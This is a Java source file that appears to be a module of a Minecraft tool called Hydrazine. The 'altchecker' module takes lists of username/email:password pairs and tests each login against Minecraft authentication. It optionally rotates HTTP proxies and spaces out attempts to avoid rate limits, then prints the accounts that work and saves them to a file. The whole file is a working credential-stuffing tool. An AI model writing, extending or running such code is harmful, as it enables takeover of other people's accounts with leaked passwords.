package com.github.hydrazine.module.builtin;

import java.io.File;
import java.io.IOException;
import java.net.Proxy;
import java.net.Proxy.Type;
import java.nio.file.Files;
import java.nio.file.StandardOpenOption;
import java.util.ArrayList;
import java.util.Random;

import org.spacehq.mc.protocol.MinecraftProtocol;

import com.github.hydrazine.Hydrazine;
import com.github.hydrazine.minecraft.Authenticator;
import com.github.hydrazine.minecraft.Credentials;
import com.github.hydrazine.module.Module;
import com.github.hydrazine.module.ModuleSettings;
import com.github.hydrazine.util.FileFactory;

public class AltCheckerModule implements Module
{

	// Create new file where the configuration will be stored (Same folder as jar file)
	private File configFile = new File(ClassLoader.getSystemClassLoader().getResource(".").getPath() + ".module_" + getName() + ".conf");
	
	// Configuration settings are stored in here
	private ModuleSettings settings = new ModuleSettings(configFile);
	
	// List of valid accounts
	private ArrayList<Credentials> validCredentials;
	
	// Output File
	private File outputFile;
	
	@Override
	public String getName()
	{
		return "altchecker";
	}

	@Override
	public String getDescription()
	{
		return "Cycles through a list of accounts to check if they are able to log in. (Format: username/email:password)";
	}

	@Override
	public void start() 
	{
		if(!configFile.exists())
		{
			settings.createConfigFile();
		}
		
		settings.load();
		
		validCredentials = new ArrayList<Credentials>();
		
		Authenticator auth = new Authenticator();
		
		if(Boolean.valueOf(settings.getProperty("outputToFile")))
		{
			outputFile = new File(settings.getProperty("outputFile"));
			
			if(!outputFile.exists())
			{
				try
				{
					outputFile.createNewFile();
				}
				catch (IOException e)
				{
					System.out.println(Hydrazine.errorPrefix + "Unable to create config file");
				}
			}
		}
		
		if(settings.containsKey("loadFromFile") && settings.getProperty("loadFromFile").equals("true"))
		{
			File inputFile = new File(settings.getProperty("inputFile"));
			FileFactory factory = new FileFactory(inputFile);
			FileFactory proxyFactory;
			Random r = new Random();
			Credentials[] creds = factory.getCredentials();
			
			for(Credentials c : creds)
			{
				MinecraftProtocol mp;
				
				if(!Boolean.valueOf(settings.getProperty("useProxies")))
				{
					mp = auth.authenticate(c);
				}
				else
				{
					proxyFactory = new FileFactory(new File(settings.getProperty("proxyFile")));
					Proxy p = proxyFactory.getProxies(Type.HTTP)[r.nextInt(proxyFactory.getProxies(Type.HTTP).length)];
					mp = auth.authenticate(c, p);
				}
				
				if(mp != null)
				{
					validCredentials.add(c);
				}
				
				try 
				{
					Thread.sleep(Long.valueOf(settings.getProperty("loginDelay")));
				} 
				catch (NumberFormatException | InterruptedException e)
				{
					stop(e.toString());
				}
			}
			
			System.out.println("\nWorking Accounts:");
			String s = "";
			
			for(Credentials c : validCredentials)
			{
				s = s + c.getUsername() + ":" + c.getPassword() + "\n";
				System.out.println(c.getUsername() + ":" + c.getPassword());
			}
			
			if(Boolean.valueOf(settings.getProperty("outputToFile")))
			{
				try 
				{
				    Files.write(outputFile.toPath(), s.getBytes(), StandardOpenOption.APPEND);
				    
				    System.out.println("\n" + Hydrazine.infoPrefix + "Saved working accounts to: " + outputFile.getAbsolutePath());
				}
				catch (IOException e) 
				{
					e.printStackTrace();
				}
			}
		}
		else if(Hydrazine.settings.hasSetting("credentials"))
		{
			Credentials c = Authenticator.getCredentials();
			
			MinecraftProtocol mp = auth.authenticate(c);
			
			if(mp != null)
			{
				System.out.println(Hydrazine.infoPrefix + c.getUsername() + ":" + c.getPassword() + " is working");
				
				if(Boolean.valueOf(settings.getProperty("outputToFile")))
				{
					String s = c.getUsername() + ":" + c.getPassword();
					
					try 
					{
					    Files.write(outputFile.toPath(), s.getBytes(), StandardOpenOption.APPEND);
					}
					catch (IOException e) 
					{
						e.printStackTrace();
					}
				}		
			}
		}
		else
		{
			System.out.println(Hydrazine.errorPrefix + "You have to either configure the module to use a list (-c) or use the -cr switch to check a single account. (Format: username/email:password)");
		}
	}

	@Override
	public void stop(String cause)
	{
		System.out.println(Hydrazine.infoPrefix + "Stopping module " + getName() + ": " + cause);
		
		System.exit(0);
	}

	@Override
	public void configure()
	{
		settings.setProperty("loadFromFile", String.valueOf(ModuleSettings.askUserYesNo("Load accounts from file?")));
		
		if(Boolean.valueOf(settings.getProperty("loadFromFile")))
		{
			settings.setProperty("inputFile", ModuleSettings.askUser("File path:"));
			settings.setProperty("loginDelay", String.valueOf(ModuleSettings.askUser("Delay between login attempts (in milliseconds):")));
		}
		
		settings.setProperty("useProxies", String.valueOf(ModuleSettings.askUserYesNo("Use proxies (https)?")));
		
		if(Boolean.valueOf(settings.getProperty("useProxies")))
		{
			settings.setProperty("proxyFile", ModuleSettings.askUser("File path:"));
		}
		
		settings.setProperty("outputToFile", String.valueOf(ModuleSettings.askUserYesNo("Output working accounts to file?")));
		
		if(Boolean.valueOf(settings.getProperty("outputToFile")))
		{
			settings.setProperty("outputFile", ModuleSettings.askUser("File path:"));
		}
		
		if(!configFile.exists())
		{
			boolean success = settings.createConfigFile();
			
			if(!success)
			{
				return;
			}
		}
		
		// Store configuration variables
		settings.store();
	}

}
